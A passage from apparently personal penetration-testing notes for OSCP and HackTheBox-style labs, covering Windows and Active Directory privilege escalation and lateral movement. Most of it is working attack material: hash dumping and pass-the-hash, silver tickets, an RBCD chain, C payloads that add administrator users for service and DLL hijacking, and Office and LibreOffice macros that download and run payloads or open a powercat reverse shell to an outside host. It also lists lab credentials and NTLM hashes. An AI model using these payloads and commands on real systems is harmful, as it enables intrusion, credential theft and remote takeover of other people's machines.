Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
[*] Cleaning up... 
                          
```


```
secretsdump.py -user-status -history -pwd-last-set -sam SAM -system SYSTEM LOCAL            # local secrets dump of all the machines local creds
```

```
secretsdump.py -user-status -history -pwd-last-set -ntds ntds.dit -system SYSTEM LOCAL      # local secrets dump of all the AD creds 
```




#### impacket-psexec
If we have a obtained the hashes ( as above) we can then `pass-the-hash` with `impacket-psexec` to get a system shell on the box with a command structred as follows:
```
impacket-psexec <DOMAIN>/<USERNAME-OF-HASH>@<IP_ADDRESS> -hashes <LMHASH>:<NTHASH>          # impacket psexec example command for a reverse shell
impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e   # impacket psexec example command for a reverse shell
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee svccorp.com/tris@10.129.95.180     # impacket psexec example command for a reverse shell
proxychains -q impacket-psexec -hashes e728ecbadfb02f51ce8eed753f3ff3fd:e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@10.10.80.140    # impacket psexec example command for a reverse shell - OSCP (A)
```

```
impacket-psexec inlanefreight.local/CT059:charlie1@172.16.139.3         # Alternative for foothold, shell reverse shell - HTB AD Course
```

<details>
	<summary>Example output</summary>

```
└─$ impacket-psexec egotistical-bank.local/administrator@10.129.95.180 -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Requesting shares on 10.129.95.180.....
[*] Found writable share ADMIN$
[*] Uploading file fmhmoHDE.exe
[*] Opening SVCManager on 10.129.95.180.....
[*] Creating service vVaA on 10.129.95.180.....
[*] Starting service vVaA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.973]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
</details>

#### Add computer 
- `impacket-addcomputer 'authority.htb/svc_ldap' -method LDAPS -computer-name 'HACKER' -computer-pass 'Tuesday@2' -dc-ip 10.129.218.144`


#### Get Silver Ticket

Silver Ticket forge requires 3 things: an SPN's password hash, Domain SID, Target SPN . If we are local Admin on a mchine we ca nget these with mimkatz.
```
mimkatz #  privilege::debug                                                                                                             # Silver Tickets - 1 Get the SPN hashes from     
mimkatz #  sekurlsa::logonpasswords                                                                                                     # Silver Tickets - 2 Get the SPN hashes from 
CP:> whoami /user                                                                                                                       # Silver Tickets - 3 Get the SID of the entity - These can be obtained from other places
mimkatz # kerberos::golden /sid:<SID_VALUE> /domain:corp.com /target:web04.corp.com /service:http /rc4:<SPN-HASH> /ptt /user:jeffadmin  # Silver Tickets - 4 Golden is misleading but this is the structure of the command

mimkatz # kerberos::golden /sid:<SID_VALUE> /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:<EXISTING_USER>  # Silver Tickets - 4 Golden is misleading but this is the structure of the command
CP:> klist                                                                                                                             # Silver Tickets - 5 verify the ticket is no in memory and ready to uses
CP:> PsExec.exe \\web04.corp.com -s cmd.exe                                                                                            # Silver Tickets - 6 - Now in memory the ticket can be used for thing like this
```

```sh
┌──(kali㉿kali)-[~/…/Machines/AUTHORITY/Certipy/certipy]
└─$ impacket-getST -spn 'cifs/AUTHORITY.authority.htb' -impersonate Administrator 'authority.htb/HACKER$:Tuesday@2'
Impacket v0.11.0 - Copyright 2023 Fortra

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

#### Unconstrained Delegation
- https://adsecurity.org/?p=1667
- https://blog.harmj0y.net/redteaming/another-word-on-delegation/

Any accounts (user or computer) that have service principal names (SPNs) set in their `msDS-AllowedToDelegateTo` property can pretend to be any user in the domain (they can “delegate”) to those specific SPNs. 

#### RBCD (Resourc Based Constrained Delegation) Attack - [Here](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/kerberos-delegation-rbcd/) and [here](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)

assuming we control an account with `S4U2Self` enabled, and another account that had edit rights over a computer object we want to target, we can modify the target computer object’s `msDS-AllowedToActOnBehalfOfOtherIdentity` property to include the `S4U2Self` account as the principal and execute the Rubeus s4u process to gain access to any Kerberos supporting service on the system! 


Essentially: GenericAll on a DC allows creating fake computers, setting RBCD, obtaining Administrator tickets, and escalating to full control. RBCD (Resource Based Constrained Delegation) Attack - AD Privesc

1. Check for generic all on the DC                                              
1. Create a computer                                                            
1. With the [RBCD script](https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py) Set the `msds-allowedtoactonbehalfofotheridentity` property on out Computer Object
1. Get a Ticket which impersonates an Administrator
1. Add the ticket location to a environment variable
1. run PSexec as the admin

##### RBCD Attack commands below ( my steps)
1. Check for generic all on the DC
```
PV:> Get-ObjectAcl -Identity "Domain Admins" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights                                        # RBCD Attack - Open full notes : 1. Chekc for GenericAll
```
2.  Create a computer in the Active directory ( because we have `GenericAll`)
```
K:> impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.179.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'        # RBCD Attack - Open full notes : 2,. Add a computer 
```
3. Set the `msds-allowedtoactonbehalfofotheridentity` property on our Computer Object
```
K::> sudo python3 rbcd.py -dc-ip 192.168.179.175 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                         # RBCD Attack - Open full notes : 3. Set teh property to impersonate 
```
4. Get a Ticket from the "Computer" account which impersonates an Administrator
```
K:> impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 192.168.179.175                                           # RBCD Attack - Open full notes : 4. Get an admin ticket from our "fake" computer 
```
5. Add the ticket location to a environment variable
```
K:> export KRB5CCNAME=Administrator@RESOURCED.LOCAL.ccache                                                                                                                            # RBCD Attack - Open full notes 4. set the ticket as the envar
```
6. run PSexec as the admin with the ticket ot get a shell
```
K:> sudo impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.179.175                                                                                                # RBCD Attack - Open full notes 5. Shel via psexec
```



### Watson ( Windows Privesc tool)
https://github.com/rasta-mouse/Watson 

`.net` version needs to be compatible between this version and the target. All availible will be in...:

```
PS C:\Windows\Microsoft.net\Framwork64\v*******\
PS C:\Windows\Microsoft.net\Framwork64\v*******> $file = Get-Item .\clr.dll
PS C:\Windows\Microsoft.net\Framwork64\v*******> [System.Diagnostics.FileVersionInfo]::GetVersionInfo($file).FileVersion

4.7..3190.0 built by Blah             # Google 4.7.3190.0 This for the version number
```
ITs a bit tricky and might need some research
and the bitsize needs to be the same.
You could compile it as a `dll`. Once on he machine run with
```
PS C:\users\Blah> [reflection.Assembly]::LoadFile("C:\users\path\to\Watson.dll")`
PS C:\users\Blah [Watson.Program]::Main()
```


##### [Unquoted Service Paths](https://www.tenable.com/sc-report-templates/microsoft-windows-unquoted-service-path-vulnerability)
Service Binary Hijacking 
1. Enumerate running and stopped services.
```sh
Get-CimInstance -ClassName win32_service | Select Name,State,PathName                                                           # Windows Privesc - Unquoted Service Paths  - Look for spaces in paths 
```
In the windows cmd shell (not powershell) we can run 
```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """                                              # Windows Privesc - Unquoted Service Paths in the Windwos dir
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v "\""    # Windows Privesc - Unquoted Service Paths - From the Offsec Academy 
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" |findstr /i /v """        # Windows Privesc - Unquoted Service Paths
```
Alternatively, we could use [Select-String](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/select-string?view=powershell-7.2) in PowerShell.

This will list out all the file paths which have spaces in them for example:                                                                                                                                            # Windows Privesc - Unquoted Service Paths 
- `C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe`                                       # Windows Privesc - Unquoted Service Paths 
	- We could create an `Enterprise.exe` and place it in `C:\Program Files`                               # Windows Privesc - Unquoted Service Paths 
	- or we could create a `Current.exe` and place that in `C:\Program Files\Enterprise Apps`              # Windows Privesc - Unquoted Service Paths 
2. Check path permissions with `icacls <PATH_TO_EXECUTABLE>`                                             # Windows Privesc - Unquoted Service Paths 
3. (Optional) **If it is safe to do so** check if we can start and stop the identified service as _steve_ with **Start-Service** and **Stop-Service**.                                                                                        # Windows Privesc - Unquoted Service Paths 

```
PS C:\Users\steve> Start-Service <SERVICENAME>                                                 # Windows Privesc - Unquoted Service Paths - Check if we can start/stop services (instead of a full reboot) withouit the exe, even if there was an error, still check for the privesc
PS C:\Users\steve> Stop-Service <SERVICENAME>                                                  # Windows Privesc - Unquoted Service Paths - Check if we can start/stop services (instead of a full reboot) even if there was an error, still check for the privesc
```
If we can restart here we don't need to issue a reboot.                                                   # Windows Privesc - Unquoted Service Paths 
```
shutdown /r /t 0    # Restart windows when trying to do an unquoted service path injection                # Windows Privesc - Unquoted Service Paths 
```
5. Create a payload - eg: new admin user in C code and cross compile it as the name of the `.exe` file we need          # Windows Privesc - Unquoted Service Paths 
- `msfvenom -p windows/adduser USER=Frank PASS=Zappamuffin! -f exe -o NAME_OF_BINARY.exe`                               # Windows Privesc - Unquoted Service Paths 

OR 

```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 Tuesday@2 /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
```
K: x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
Might need installing on Kali: `do apt-get install mingw-w64`


Or make an msfvenom payload, or inject code to an existing binary
```
msfvenom -p windows/adduser USER=Frank PASS=Zappamuffin! -f exe -o NAME_OF_BINARY.exe      #  Unquoted Service Path - adda new user is one option . Could do a reveres shell
```

5. Transfer over to the host

```
PS:> iwr -uri http://192.168.179.188/adduser.exe -Outfile Current.exe
PS:> copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
```

6. Showdown is applicable/required 

Once we have placed the binary in the dir we need to try and restart the service.
either by:
- Restarting the serviuce 
- Restarting the machine (if we have `SeShutDownPrivilege`) 
	- `shutdown /r /t 0`

##### DLL check if dll safe mode is on 

```
$regKey = Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager"
if ($regKey.PSObject.Properties.Name -contains 'SafeDllSearchMode') {
    $regKey.SafeDllSearchMode
} else {
    Write-Host "SafeDllSearchMode is not explicitly set. The system is using the default, which is enabled."
}
```
#### DLL Hijacking / Injection - (Service Binary Hijacking) 
To exploit this situation, we can try placing a malicious DLL (with the name of the missing DLL) in a path of the DLL search order so it executes when the binary is started. 
The Current standard DLL Search order on Windows Versions (DLL Hijacking):
1. The directory from which the application loaded.                                                                   # DLL Hijacking - DLL Search order on Windows
2. The system directory.                                                                                              # DLL Hijacking - DLL Search order on Windows
3. The 16-bit system directory.                                                                                       # DLL Hijacking - DLL Search order on Windows
4. The Windows directory.                                                                                             # DLL Hijacking - DLL Search order on Windows
5. The current directory.                                                                                             # DLL Hijacking - DLL Search order on Windows
6. The directories that are listed in the PATH environment variable.                                                  # DLL Hijacking - DLL Search order on Windows
Note: When safe DLL search mode is disabled, the current directory is searched at position 2 after the application's directory.
Also , even with a missing DLL, the program may still work with restricted functionality.

STEPS
1. Test if you can write to the location the dll will go
```
PS C:\Users\steve> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
PS C:\Users\steve> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

2. Use [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) or similar to display real-time information about a target dll. [ProcMon Basics](https://concurrency.com/blog/procmon-basics/) . If this is not availible , we will have to copy the service over to our local machine.
If you import the binary to you lab machine where tyo ucan run proc mon ( requires admin) , you will have to launc the binary asa service like in offsec Relia : `C:> sc create Scheduler2 binPath= "C:\Users\offsec\Desktop\scheduler.exe" DisplayName= "Scheduler2" start= auto` we would then need to start out service as follows: `C:> sc start Scheduler2`

3. Identify all DLLs loaded by "_BetaService_" as well as detect missing ones. 

4. Check if the `SafeDllSearchMode` is turned on `reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode` if not we might be able to put a malicious missing dll in the same dir as he binary

5. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. Alternatively, if find that a DLL is missing, provide our own DLL by adhering to the DLL search order.

6.  Reusing the C code from the previous section by adding the _include_ statement as well as the system function calls to the C++ DLL code. Additionally, we need to use an _include_ statement for the header file **windows.h**, since we use Windows specific data types such as _BOOL_. The final code is shown in the following listing.

```c
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 Tuesday@2 /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

Perhaps FIrst ; install the following : `sudo apt install mingw-w64`

Cross compile the above with: `x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll`

----


## DLL hijacking - find writable locations

```
P:> $env:Path -split ';' | ForEach-Object { if ($_ -ne '') { $icaclsOutput = cmd.exe /c icacls "$_" 2>$null; if ($icaclsOutput -match "(F)|(M)|(W)" -and $icaclsOutput -match ":\\ everyone|authenticated users|todos|$env:USERNAME") { Write-Host $_ } } }     # dll hijacking - find writable locations
C:> for %A in ("%path:;=";"%") do (cmd.exe /c icacls "%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo %~A)     # dll hijacking - find writable locations
```



## Weak Registry Permissions -
```
tasklist /SVC                                                                                                                       # Weak Registry Check - Weak Registry Check - List services and binaries  
sc qc <ServiceName>                                                                                                                 # Weak Registry Check - Show service config including image and owner  
accesschk.exe /accepteula -uvwqk "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>"                                             # Weak Registry Check - Check registry key perms  
powershell -c "(Get-Acl 'HKLM:\SYSTEM\CurrentControlSet\Services\<ServiceName>').Access"                                            # Weak Registry Check - Alt: view perms with PowerShell  
reg add "HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>" /v ImagePath /t REG_EXPAND_SZ /d "C:\Path\to\payload.exe" /f         # Weak Registry Check - Overwrite binary path  
net stop <ServiceName>                                                                                                              # Weak Registry Check - Stop the service to reload binary  
net start <ServiceName>                                                                                                             # Weak Registry Check - Start service to trigger payload  
```

### File Permissions That Allow Service Binary Exploitation
Used to identify when a low-priv user can replace or alter a service binary to gain SYSTEM privileges.

```
WRITE_DAC          # Allows modifying the file's access control list (ACL)
WRITE_OWNER        # Allows taking ownership of the file
DELETE             # Allows deleting the binary file
FILE_WRITE_DATA    # Allows overwriting the binary (critical for replacing service executables)
FILE_APPEND_DATA   # Allows appending data to the binary (less common but still useful)
MODIFY             # Composite permission: includes read/write/delete (often enough to exploit)
FULL CONTROL       # Grants all rights over the file (most dangerous)
GENERIC_ALL        # Windows generic permission for full access (same as FULL CONTROL)
```




#### Note on Useing Procmon

Tmp: See ProcMon Notes for Dll hijacking in the folder 
Also we ca nuse sigcheck form the sysinternals to view if a file is signed or unsigned
PS C:\Users\offsec\Desktop> .\sigcheck64.exe -e C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Xml\v4.0_4.0.0.0__b77a5c561934e089\System.XML.dll

###### Sneaky file ready with robocopy

`robocopy "C:\Users\enterpriseadmin\Desktop" . flag.txt /B /R:1 /W:1`

`robocopy "C:\Target\path\Directory" . FILE.txt /B /R:1 /W:1`
- **`/B`**: This stands for **Backup mode**. It tells `robocopy` to use the **SeBackupPrivilege**, which allows copying files even if the current user does not have explicit permissions to access them.
- **`/R:1`**: This option sets the **retry count** to `1`, meaning `robocopy` will retry copying the file **once** if there's an issue (e.g., if the file is in use).  
- **`/W:1`**: This option sets the **wait time** between retries to `1 second`. If an issue occurs and `robocopy` has to retry copying, it will wait 1 second between attempts.


##### SeBackupPrivilege and or SeRestorePrivilege - Exploiting

if you have both SeBackupPrivilege and SeRestorePrivilege you may just be able to run the following and then download them to your local machine

```
reg save HKLM\SYSTEM C:\Windows\Tasks\SYSTEM                      # SeBackupPrivilege + SeRestorePrivilege
reg save HKLM\SAM C:\Windows\Tasks\SAM                            # SeBackupPrivilege + SeRestorePrivilege
```


Another way is with the dlls and a vss.sh
With SeBackupPrivilege get these dlls if not in tools dirs - https://github.com/k4sth4/SeBackupPrivilege. (Offsec OCSP PG Zeus):
```
P:> import-module ./SeBackupPrivilege*****.dll                                                 # SeBackupPrivilege - Privesc via direct Hive copy's - upload and import BOTH dll's from the repo or Tools
P:> Copy-FilesSeBackupPrivilege C:\Path\to\the\Target C:\Path\to\the\Save\Location             # SeBackupPrivilege - Privesc via direct Hive copy's - See Posiedon OSCP
P:> Copy-FileSeBackupPrivilege z:\\Windows\\ntds\\ntds.dit ntds.dit                            # SeBackupPrivilege - Privesc via direct Hive copy's 
P:> Reg.exe save hklm\sam C:\Windows\Tasks\SAM                                                 # SeBackupPrivilege - Privesc via direct Hive copy's 
P:> Reg.exe save hklm\system C:\Windows\Tasks\SYSTEM                                           # SeBackupPrivilege - Privesc via direct Hive copy's 
```



#### xfreerdp3  (Connect to a a windows machine from Linux)
xfreerdp3  also supports [NLA](https://en.wikipedia.org/wiki/Remote_Desktop_Services#Network_Level_Authentication) for non domain-joined machines.

Open a regular connection:
`xfreerdp3  /u:student /p:lab /v:192.168.179.152`
Open a regular with full screen:
`xfreerdp3  /u:student /p:lab /v:192.168.179.152 /f`
Regular connection with a local tmp dir:
`xfreerdp3  /u:offsec /p:lab /v:192.168.X.194 /drive:/tmp`
Larger size
`xfreerdp3  /u:offsec /p:lab /v:192.168.179.10 /size:1920x1080 /smart-sizing`
IGnore the cirt
`xfreerdp3  /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.179.75 /smart-sizing /size:1920x1080`
Lower tls level and share the local dir
`xfreerdp3  /u:nas /p:lab /v:192.168.179.106 /smart-sizing /size:1920x1080 /tls:seclevel:0  /cert:ignore /drive:kali,.`
Includeing a DOMAIN ( Important for AD)
`xfreerdp3  /u:jess /p:P@ssword /v:192.168.179.215 /d:offsec.live /smart-sizing /size:1920x1080 /tls:seclevel:0  /cert:ignore /drive:kali,.`
Use a hash value when logging in
`xfreerdp3  /u:offsec /d:oscp.lab /pth:<hash> +clipboard /cert:ignore`

xfreerdp3 /v:127.0.0.1:1234 /u:"inlanefreight\svc_sql" /p:"lucky7" /dynamic-resolution /drive:Shared,/home/kali/Tools/ImmidiateTools

```
xfreerdp3  /u:'hacker' /p:'Tuesday@2' /v:172.16.139.11 /smart-sizing /size:1920x1080 /proxy:socks5://127.0.0.1080 /tls:seclevel:0  /cert:ignore /drive:kali,.
xfreerdp3  ->> xfreerdp3  /u:'hacker' /p:'Tuesday@2' /v:192.168.179.11 /smart-sizing /size:1920x1080 /compression /auto-reconnect /tls:seclevel:0  /cert:ignore /drive:kali,.
proxychains xfreerdp3  /u:hacker /p:Tuesday@2 /v:172.16.139.83 /smart-sizing /size:1920x1080 /tls:seclevel:0  /cert:ignore /drive:kali,.
```


Various commands that may help in connecting to various lab instances, some have compression flags to help speed up connections:

```sh
xfreerdp3  /cert:ignore /compression /auto-reconnect /u:USERNAME /p:PASSWORD /v:IP_ADDRESS
sudo rdesktop -u USERNAME -p PASSWORD -g 90% -r disk:local="/home/kali/Desktop/" IP-ADDRESS
rdesktop -u USERNAME -p PASSWORD -a 16 -P -z -b -g 1280x860 IP_ADDRESS
xfreerdp3  /u:USERNAME /p:PASSWORD /cert:ignore /v:IP_ADDRESS /w:2600 /h:1400
xfreerdp3  +nego +sec-rdp +sec-tls +sec-nla /d: /u: /p: /v:IP_ADDRESS /u:USERNAME /p:PASSWORD /size:1180x708
rdesktop -z -P -x m -u USERNAME -p PASSWORD
xfreerdp3  /u:USERNAME /p:'PASSWORD' /v:IP_ADDRESS
xfreerdp3  /cert:ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1400 /u:USERNAME /p:'PASSWORD' /v:IP_ADDRESS
xfreerdp3  /cert:ignore /compression /auto-reconnect /d:DOMAIN_NAME /u:USERNAME /p:PASSWORD /v:IP_ADDRESS
```
### Macros 
Word, PowerPoint, Outlook, Publisher, Access, Excel, and OneNote.
Handy script to make various macros https://github.com/jotyGill/macro-generator
Or this tool for Libre Office macros - https://github.com/0bfxgh0st/MMG-LO/
Encode the Powershell command with base64 to UTF-16LE to avoid issues with special characters 

**Good tool for malicious odt files** (CVs, Word Docuemtns Resumes) to run malicious macros - https://github.com/rmdavy/badodf/blob/master/badodt.py - Offsec box Craft2

Use the following Python script to split the powershell base64-encoded  string into smaller chunks of 50 characters and concatenate them into the _Str_ variable. To do this, we store the PowerShell command in a variable named _str_ and the number of characters for a chunk in _n_. We must make sure that the base64-encoded command does not contain any line breaks after we paste it into the script. A for-loop iterates over the PowerShell command and prints each chunk in the correct format for our macro.

```py
str = "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAdwA..."
n = 50
for i in range(0, len(str), n):
	print("Str = Str + " + '"' + str[i:i+n] + '"')
```

We can then update our macro, save and close it :

```vb
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String
    
    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
        Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
        Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    ...
        Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADEAMQA4AC4AMgAgAC0AcAA"
        Str = Str + "gADQANAA0ADQAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsA"
        Str = Str + "A== "

    CreateObject("Wscript.Shell").Run Str
End Sub
```

Next we need to open a webserver to distribute the PowerCat Script and a netcat listener to catch the shell. Opening the document should fetch the script and return a reverse shell. Often best to save it as a **`97-2003 .doc`** or a `docm` file 



# Macro Examples ( odt etc )




Robust Offsec PG - Hutch & Craft - Create an *Libre Offic Calc* . `.ods` file with the folling macro 
- 1. Get Powercat from a server 
- 2. RUn powercat back to port 443 listener )
- 
```vb
REM  *****  BASIC  *****

Sub Main

Shell("cmd /c powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.166/powercat.ps1');powercat -c 192.168.45.166 -p 443 -e powershell")
	
End Sub
```


On Libre Calc (Excel like) This can be placed in the Macro. 
One may need to go into `Options>Security>Macro Secutrity...` and set it to `Low`.

## Download a shell
(But this wont run it)
```vb
Sub AutoOpen()
    Dim tempPath As String
    Dim downloadCmd As String

    tempPath = Environ("TEMP") & "\shell.exe"
    
    downloadCmd = "cmd.exe /c certutil -urlcache -split -f http://192.168.179.172/shell.exe " & Chr(34) & tempPath & Chr(34)
    
    Shell downloadCmd, vbHide
End Sub
```

### Download a shell and run it : 
On Offsec Hepet , this bricked the machine
```vb
Sub AutoOpen()
    Dim tempPath As String
    Dim downloadCmd As String
    Dim runCmd As String

    tempPath = Environ("TEMP") & "\shell.exe"

    ' Download the file
    downloadCmd = "cmd.exe /c certutil -urlcache -split -f http://192.168.179.172/shell.exe " & Chr(34) & tempPath & Chr(34)
    Shell downloadCmd, vbHide

    ' Give it a second to download (optional)
    Application.Wait (Now + TimeValue("0:00:02"))

    ' Execute the downloaded file
    runCmd = "cmd.exe /c " & Chr(34) & tempPath & Chr(34)
    Shell runCmd, vbHide
End Sub

```

### Start a reverse shell with powershell 
Note: The payload is taken out of `evil.hta` from:
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.179.8 LPORT=443 -f hta-psh -o evil.hta`

```vb
REM  *****  BASIC  *****
Sub AutoOpen()

    Dim Str As String
    
	Str = Str + "cmd.exe /C powershell.exe -nop -w hidden -e aQBmAC"
	Str = Str + "gAWwBJAG4AdABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEA"
	Str = Str + "IAA0ACkAewAkAGIAPQAnAHAAbwB3AGUAcgBzAGgAZQBsAGwALg"
	Str = Str + "BlAHgAZQAnAH0AZQBsAHMAZQB7ACQAYgA9ACQAZQBuAHYAOgB3"
	...
	...
	Str = Str + "BhAHQAZQBOAG8AVwBpAG4AZABvAHcAPQAkAHQAcgB1AGUAOwAk"
	Str = Str + "AHAAPQBbAFMAeQBzAHQAZQBtAC4ARABpAGEAZwBuAG8AcwB0AG"
	Str = Str + "kAYwBzAC4AUAByAG8AYwBlAHMAcwBdADoAOgBTAHQAYQByAHQA"
	Str = Str + "KAAkAHMAKQA7AA=="

    Shell Str, vbHide
End Sub
```

# ------------------ ACTIVE DIRECTORY AD  ------------------

Want to Enumerate:
- Groups and members
- Usernames
- Admin accounts
- The domains
- Computers 
- Operating system details
- dnshostnames
- LDAP paths

Use [net.exe](https://learn.microsoft.com/en-US/troubleshoot/windows-server/networking/net-commands-on-operating-systems), which is installed by default on all Windows operating systems.

```
net user /domain                        # AD - Windows Enum with native tools - list users and groups
net user jeffadmin /domain              # AD - Windows Enum with native tools - Specific user info. Is a Domain/Enterprise Admin???
net group /domain                       # AD - Windows Enum with native tools - looks custom groups not in AD default list
net group "Sales Department" /domain    # AD - Windows Enum with native tools - look in a specific group

net user stephanie                      # AD - Windows Enum with native tools - Remember if we dont provide the /domain , it will search on the local machine and the user might not exists!!  
Tip: Sometimes sysadmins leave passwords in user comment atribute, so don't rule them out.

```

In powershell:

```ps
PS:> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()                       # AD - Windows Enum with native tools - Get current domain info
PS:> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner          # AD - Windows Enum with native tools - Find PDC 
PS:> [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().DomainControllers     # AD - Windows Enum with native tools - List domain controllers
PS:> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()                       # AD - Windows Enum with native tools - Get current forest info
PS:> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().GlobalCatalogs        # AD - Windows Enum with native tools - List global catalogs
PS:> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().Domains               # AD - Windows Enum with native tools - List domains in forest
PS:> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().SchemaRoleOwner       # AD - Windows Enum with native tools - Get Schema FSMO role owner
PS:> [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest().DomainNamingRoleOwner # AD - Windows Enum with native tools - Get Domain Naming FSMO role owner
```
If RAST is installed on the system 
```
Get-ADUser -Filter * -SearchBase "DC=corp,DC=com"                                           # AD -(RASRT) Windows enum with native tools - List all users
Get-ADGroup -Filter * -SearchBase "DC=corp,DC=com"                                          # AD -(RASRT) Windows enum with native tools - List all groups
Get-ADUser -Identity "username" -Properties MemberOf                                        # AD -(RASRT) Windows enum with native tools - List user’s group membership
Get-ADComputer -Filter *                                                                    # AD -(RASRT) Windows enum with native tools - List all computers in domain
(Get-ADDomain).DomainControllers                                                            # AD -(RASRT) Windows enum with native tools - Get domain controllers list
Get-GPO -All                                                                                # AD -(RASRT) Windows enum with native tools - List all Group Policy Objects (GPOs)
Get-ADGroupMember -Identity "Domain Admins"                                                 # AD -(RASRT) Windows enum with native tools - List domain admins
Get-ADDefaultDomainPasswordPolicy                                                           # AD -(RASRT) Windows enum with native tools - Get domain password policy
Get-ADOrganizationalUnit -Filter *                                                          # AD -(RASRT) Windows enum with native tools - List all organizational units
Get-ADTrust -Filter *                                                                       # AD -(RASRT) Windows enum with native tools - List domain trust relationships
```


**Domain vs Local in whoami responses**
```sh
# The Differnce between these to whoami responses is: 
corp\stephane               # We are logged into the Domain itself as stephanie
CLIENT75\\stephane          # We are logged in to a local user account on Client75
```

```
The Differnce between these to whoami responses is: 
corp\stephane      # We are logged into the Domain itself as stephanie
CLIENT75\\stephane   # We are logged in to a local user account on Client75
```


